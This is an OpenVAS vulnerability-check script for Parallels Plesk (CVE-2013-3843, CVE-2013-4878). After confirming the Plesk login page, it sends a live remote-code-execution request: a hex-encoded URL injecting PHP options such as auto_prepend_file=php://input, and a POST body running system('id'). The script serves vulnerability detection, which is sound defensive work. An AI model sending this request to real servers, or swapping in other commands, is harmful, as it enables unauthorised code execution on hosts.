###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plesk_multiple_rce_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Parallels Plesk PHP Code Execution and Command Execution Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute PHP code
  or OS commands.
  Impact Level: System/Application";

tag_affected = "Parallels Plesk versions 9.5.4, 9.3, 9.2, 9.0 and 8.6";
tag_insight = "The flaws are due to improper validation of HTTP POST requests, By sending
  a specially crafted direct request, an attacker can execute PHP code or
  OS commands.";
tag_solution = "Upgrade to Plesk 11.0.9 or later,
  http://www.parallels.com/download/plesk";
tag_summary = "This host is installed with Parallels Plesk and is prone to
  PHP code execution and command execution vulnerabilities.";

if(description)
{
  script_id(803712);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3843", "CVE-2013-4878");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-06 11:34:50 +0530 (Thu, 06 Jun 2013)");
  script_name("Parallels Plesk PHP Code Execution and Command Execution Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25986/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Jun/25");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Jun/21");
  script_xref(name : "URL" , value : "http://permalink.gmane.org/gmane.comp.security.full-disclosure/89512");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/php/plesk-apache-zeroday-remote-exploit");

  script_description(desc);
  script_summary("Check if Plesk is vulnerable to RCE");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80, 8443);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("openvas-https.inc");

## Variable Initialization
port = "";
host = "";
dport = "";
req = "";
res = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Default port of Plesk
dport = get_http_port(default:8443);
if(!port){
 dport  = 8443;
}

## Check the port status
if(!get_port_state(port) || !get_port_state(dport)){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(!host){
  exit(0);
}

req = string("GET /login_up.php3 HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");
res = https_req_get(port:dport, request:req);

## Confirm the application before trying exploit
if(res && "Parallels Plesk" >< res && ">Log in to Parallels" >< res)
{
  ## uri_escape arguments
  url = "/%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F" +
        "%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%6" +
        "6%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%" +
        "6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69" +
        "%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D" +
        "%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2" +
        "D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3" +
        "D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E";

  ## Construct the POST data
  postdata = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";' +
             'system("id;"); ?>';

  req = string("POST ", url ," HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Check the results of 'id' command
  if(res && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:res))
  {
    security_hole(port);
    exit(0);
  }
}
